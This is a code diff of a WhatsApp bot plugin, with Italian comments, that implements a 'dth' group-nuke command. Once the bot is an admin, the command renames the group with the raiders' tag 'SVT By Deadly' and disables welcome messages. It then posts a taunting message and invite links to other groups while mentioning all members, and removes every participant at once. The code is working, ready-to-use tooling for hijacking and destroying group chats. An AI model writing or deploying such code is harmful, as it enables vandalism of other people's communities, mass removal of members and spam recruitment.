@@ -1,55 +1,47 @@
-let handler = async (m, { conn, participants, isBotAdmin }) => {
-    if (!m.isGroup) return;
+let handler = async (m, { conn, args, groupMetadata, participants, usedPrefix, command, isBotAdmin, isSuperAdmin }) => {
+    let ps = participants.map(u => u.id).filter(v => v !== conn.user.jid);
+    let bot = global.db.data.settings[conn.user.jid] || {};
+    if (ps == '') return;
+    const delay = time => new Promise(res => setTimeout(res, time));
 
-    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
-    if (!ownerJids.includes(m.sender)) return;
+    switch (command) {
+        case "dth":  
+            if (!bot.restrict) return;
+            if (!isBotAdmin) return;
 
-    if (!isBotAdmin) return;
+            // 🔥 Cambia NOME del gruppo
+            let oldName = groupMetadata.subject || "";
+            let newName = `${oldName} | 𝐒𝐕𝐓 𝐁𝐲 𝕯𝖊ⱥ𝖉𝖑𝐲`;
+            await conn.groupUpdateSubject(m.chat, newName);
 
-    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
+            // 🔥 Disattiva welcome
+            global.db.data.chats[m.chat].welcome = false;
 
-    // 🔹 CAMBIO NOME GRUPPO
-    try {
-        let metadata = await conn.groupMetadata(m.chat);
-        let oldName = metadata.subject;
-        let newName = `${oldName} | 𝚂𝚅𝚃 𝙱𝚢 𝕯𝖊ⱥ𝖉𝖑𝐲 & Astro`;
-        await conn.groupUpdateSubject(m.chat, newName);
-    } catch (e) {
-        console.error('Errore cambio nome gruppo:', e);
-    }
+            // 🔥 Messaggio introduttivo
+            await conn.sendMessage(m.chat, {
+                text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥'𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐬𝐯𝐮𝐨𝐭𝐚𝐭𝐢 𝐝𝐚𝐥𝐥'𝐮𝐧𝐢𝐜𝐨 𝐞 𝐬𝐨𝐥𝐨 𝕯𝖊ⱥ𝖉𝖑𝐲"
+            });
 
-    let usersToRemove = participants
-        .map(p => p.jid)
-        .filter(jid =>
-            jid &&
-            jid !== botId &&
-            !ownerJids.includes(jid)
-        );
+            // 🔥 Link + menzioni
+            let utenti = participants.map(u => u.id);
+            await conn.sendMessage(m.chat, {
+                text: `𝐎𝐫𝐚 𝐞𝐧𝐭𝐫𝐚𝐭𝐞 𝐭𝐮𝐭𝐭𝐢 𝐪𝐮𝐢:\n\nhttps://chat.whatsapp.com/GijCVcITVcP2ri1h1PxKQv`,
+                mentions: utenti
+            });
 
-    if (!usersToRemove.length) return;
-
-    let allJids = participants.map(p => p.jid);
-
-    await conn.sendMessage(m.chat, {
-        text: "*NUKKATI BY ASTRO & DEADLY*"
-    });
-
-    await conn.sendMessage(m.chat, {
-        text: "𝐎𝐫𝐚 𝐞𝐧𝐭𝐫𝐚𝐭𝐞 𝐭𝐮𝐭𝐭𝐢 𝐪𝐮𝐢:\n\nhttps://chat.whatsapp.com/FkNvR56kEheEvQe02gzHsG\n\nhttps://chat.whatsapp.com/Jm93DpVn1Io42JX1DrBwc2",
-        mentions: allJids
-    });
-
-    try {
-        await conn.groupParticipantsUpdate(m.chat, usersToRemove, 'remove');
-    } catch (e) {
-        console.error(e);
-        await m.reply("❌ Errore durante l'hard wipe.");
+            // 🔥 Kicka tutti
+            let users = ps; 
+            if (isBotAdmin && bot.restrict) { 
+                await delay(1);
+                await conn.groupParticipantsUpdate(m.chat, users, 'remove');
+            }
+            break;           
     }
 };
 
-handler.command = ['dth'];
+handler.command = /^(dth)$/i;
 handler.group = true;
-handler.botAdmin = true;
 handler.owner = true;
+handler.fail = null;
 
 export default handler;
